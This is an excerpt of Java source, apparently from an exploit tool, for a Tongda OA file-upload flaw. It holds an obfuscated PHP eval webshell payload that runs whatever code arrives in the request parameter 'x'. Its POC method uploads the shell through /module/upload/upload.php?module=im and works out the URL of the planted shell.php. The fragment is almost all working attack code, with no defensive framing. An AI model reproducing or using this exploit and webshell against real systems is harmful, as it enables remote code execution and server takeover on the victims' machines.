...
public class TongdaOA_ImUpload {
    ...
    private String payload="<?php class G6uUX6lU { public function __construct($H0Lp0){ @eval(\"/*Zq2m6k6oUg*/\".$H0Lp0.\"/*Zq2m6k6oUg*/\"); }}new G6uUX6lU($_REQUEST['x']);?>";//webshell
    ...
    public boolean POC() {
        ...
        //上传shell
        path="/module/upload/upload.php?module=im";
        ...
        if (fileRequest.code()==200){
            ...
            path="/im/"+id.split("@")[1].replace("_","/").replace(",",".")+"shell.php";
            return true;
        }else {
         return false;
        }
